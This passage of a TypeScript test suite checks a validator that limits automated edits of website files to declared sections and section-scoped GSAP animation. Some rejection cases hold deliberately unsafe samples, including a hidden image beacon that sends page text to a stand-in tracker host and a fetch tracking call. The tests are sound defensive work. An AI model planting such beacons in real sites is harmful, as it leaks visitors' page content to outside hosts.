        gsap.to(window, { opacity: 1, scrollTrigger: { trigger: hero } });
        return () => {};
      }`,
    };

    expect(() =>
      assertScope(before, after, { ...scope, allowMotion: true }),
    ).toThrow(/motion target must be a declared section element/iu);
  });

  it("allows an explicitly requested animation on its declared section element", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        gsap.fromTo(hero, { opacity: 0, y: 16 }, { opacity: 1, y: 0, duration: 0.6 });
        return () => gsap.killTweensOf(hero);
      }`,
    };

    expect(() =>
      assertScope(before, after, { ...scope, allowMotion: true }),
    ).not.toThrow();
  });

  it("allows typeof guards for browser and GSAP globals before scoped animation", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (typeof window === "undefined" || typeof document === "undefined" || typeof gsap === "undefined") return () => {};
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        gsap.to(hero, { opacity: 1, duration: 0.6 });
        return () => gsap.killTweensOf(hero);
      }`,
    };

    expect(() =>
      assertScope(before, after, { ...scope, allowMotion: true }),
    ).not.toThrow();
  });

  it.each([
    ["window.fetch", "window.fetch('/track');", /section-scoped GSAP calls/iu],
    [
      "unscoped document.querySelector",
      "document.querySelector('body');",
      /declared section element/iu,
    ],
    [
      "unscoped gsap.to",
      "gsap.to(window, { opacity: 1 });",
      /declared section element/iu,
    ],
  ])(
    "rejects %s even with typeof guards",
    (_name, unsafeCall, expectedError) => {
      const before = {
        experience,
        styles: `[data-reference-section="hero"] h1 { color: #111; }`,
        motion:
          "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
      };
      const after = {
        ...before,
        motion: `export function mountExperienceMotion(runtime) {
        if (typeof window === "undefined" || typeof document === "undefined" || typeof gsap === "undefined") return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        ${unsafeCall}
        gsap.to(hero, { opacity: 1 });
        return () => {};
      }`,
      };

      expect(() =>
        assertScope(before, after, { ...scope, allowMotion: true }),
      ).toThrow(expectedError);
    },
  );

  it("supports the documented exported const motion-hook form", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export const mountExperienceMotion = (runtime) => { if (runtime?.reducedMotion) return () => {}; return () => {}; };",
    };
    const after = {
      ...before,
      motion: `export const mountExperienceMotion = (runtime) => {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        gsap.fromTo(hero, { opacity: 0 }, { opacity: 1, duration: 0.6 });
        return () => gsap.killTweensOf(hero);
      };`,
    };

    expect(() =>
      assertScope(before, after, { ...scope, allowMotion: true }),
    ).not.toThrow();
  });

  it("rejects motion hooks that write content directly into the scoped DOM", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        hero.innerHTML = "<h1>Unverified promise</h1>";
        gsap.to(hero, { opacity: 1, duration: 0.6 });
        return () => {};
      }`,
    };

    expect(() =>
      assertScope(before, after, { ...scope, allowMotion: true }),
    ).toThrow(/motion hooks cannot write directly to scoped DOM elements/iu);
  });

  it("rejects a nested duplicate hook that hides unscoped network side effects", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        const hero = document.querySelector('[data-reference-section="hero"]');
        const image = new Image();
        image.src = "https://tracker.example/" + hero.textContent;
        function mountExperienceMotion() {
          if (runtime?.reducedMotion) return () => {};
          gsap.to(hero, { opacity: 1, duration: 0.6 });
          return () => {};
        }
        return mountExperienceMotion;
      }`,
    };

    expect(() =>
      assertScope(before, after, { ...scope, allowMotion: true }),
    ).toThrow(/exactly one top-level exported mountExperienceMotion/iu);
  });

  it("rejects constructors and remote URLs in a scoped motion edit", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        const image = new Image();
        image.src = "https://tracker.example/" + hero.textContent;
        gsap.to(hero, { opacity: 1, duration: 0.6 });
        return () => {};
      }`,
    };

    expect(() =>
      assertScope(before, after, { ...scope, allowMotion: true }),
    ).toThrow(/constructors or remote URLs are not allowed/iu);
  });

  it("allows multiple explicitly declared sections to change", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }
[data-reference-section="services"] h2 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      experience: experience
        .replace(
          "<h1>{content.hero.heading}</h1>",
          '<h1 className="hero-title">{content.hero.heading}</h1>',
        )
        .replace(
          "<h2>Original services</h2>",
          '<h2 className="services-title">Original services</h2>',
        ),
      styles: before.styles.replaceAll("#111", "#333"),
    };

    expect(after.experience).toContain('className="services-title"');
    expect(() =>
      assertScope(before, after, {
        ...scope,
        sectionIds: ["hero", "services"],
      }),
    ).not.toThrow();
  });

  it("fails closed when a feedback target is ambiguous", () => {
    const ambiguousExperience = experience.replace(
      '<section id="faqs" data-reference-section="faqs"><h2>Original questions</h2></section>',
      '<section id="faqs" data-reference-section="image-chapter"><h2>Image chapter</h2></section>\n    <section data-reference-section="image-mosaic"><h2>Image mosaic</h2></section>',
    );

    expect(api.resolveCreativeRevisionScope).toBeTypeOf("function");
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: ambiguousExperience,
        feedbackItems: [
          { feedbackIndex: 0, feedback: "Improve the image section." },
        ],
      }),
    ).toThrow(/ambiguous|manual attention/iu);
  });

  it("fails closed when section markers are duplicated", () => {
    const duplicateExperience = experience.replace(
      '<section id="services" data-reference-section="services" data-service-presentation="rows"><h2>Original services</h2></section>',
      '<section id="services" data-reference-section="hero" data-service-presentation="rows"><h2>Original services</h2></section>',
    );

    expect(api.resolveCreativeRevisionScope).toBeTypeOf("function");
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: duplicateExperience,
        feedbackItems: [
          { feedbackIndex: 0, feedback: "Revise the hero section." },
        ],
      }),
    ).toThrow(/duplicate|manual attention/iu);
  });

  it.each(rejectedRepairs)(
    "rejects %s before any candidate file is swapped",
    async (_label, makeAfter, expectedError) => {
      expect(api.defaultRepairCandidate).toBeTypeOf("function");
      const candidateDir = await fs.mkdtemp(
        path.join(os.tmpdir(), "launchloom-scoped-repair-"),
      );
      roots.push(candidateDir);
      const before = {
        experience,
        styles: `:root { --ink: #111; }
[data-reference-section="hero"] h1 { color: #111; }`,
        motion:
          "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
      };
      await fs.writeFile(
        path.join(candidateDir, "metadata.json"),
        JSON.stringify({
          candidateId: "candidate-a",
          referenceDna: { familyId: "test" },
        }),
      );
      await fs.writeFile(
        path.join(candidateDir, "content-manifest.json"),
        JSON.stringify({ values: {} }),
      );
      await fs.writeFile(
        path.join(candidateDir, "Experience.jsx"),
        before.experience,
      );
      await fs.writeFile(path.join(candidateDir, "styles.css"), before.styles);
      await fs.writeFile(path.join(candidateDir, "motion.js"), before.motion);

      await expect(
        api.defaultRepairCandidate({
          candidateDir,
          findings: [
            {
              category: "human-review-feedback",
              message: "Revise the hero section.",
            },
          ],
          humanCreativeRepair: true,
          creativeRepairScope: scope,
          requestRepairImpl: async () => makeAfter(before),
          validateCandidateImpl: ({ files }: any) => ({ files }),
        }),
      ).rejects.toThrow(expectedError as RegExp);

      expect(
        await fs.readFile(path.join(candidateDir, "Experience.jsx"), "utf8"),
      ).toBe(before.experience);
      expect(
        await fs.readFile(path.join(candidateDir, "styles.css"), "utf8"),
      ).toBe(before.styles);
      expect(
        await fs.readFile(path.join(candidateDir, "motion.js"), "utf8"),
      ).toBe(before.motion);
    },
  );
});
